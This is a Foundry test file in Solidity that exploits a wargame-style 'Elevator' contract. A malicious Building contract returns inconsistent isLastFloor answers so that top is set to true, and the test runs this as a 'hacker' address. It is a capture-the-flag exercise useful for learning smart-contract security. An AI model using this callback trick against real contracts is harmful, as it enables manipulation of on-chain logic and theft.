// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import { Building, Elevator } from "../src/11_Elevator.sol";

interface Elv {
    function goTo(uint256) external;
}

contract BuildingExp {
    Elv public ev;
    bool firstCall = true;

    constructor (address _dir){
        ev = Elv(_dir);
    }
    function isLastFloor(uint256 _num) external returns (bool){
        if(firstCall){
            firstCall = false;
            return false;
        }else{
            return true;
        }
    }
    function goTo(uint256 _num) public {
        ev.goTo(_num);
    }

}
contract ElevatorTest is Test {
    Elevator public ev;
    BuildingExp public be;
    
    address public hacker = address(0x1337);

    function setUp() public {
        ev = new Elevator();
        be = new BuildingExp(address(ev));
        vm.deal(hacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(hacker);
        be.goTo(3);
        assertEq(ev.top(), true);
        vm.stopPrank();
    }
}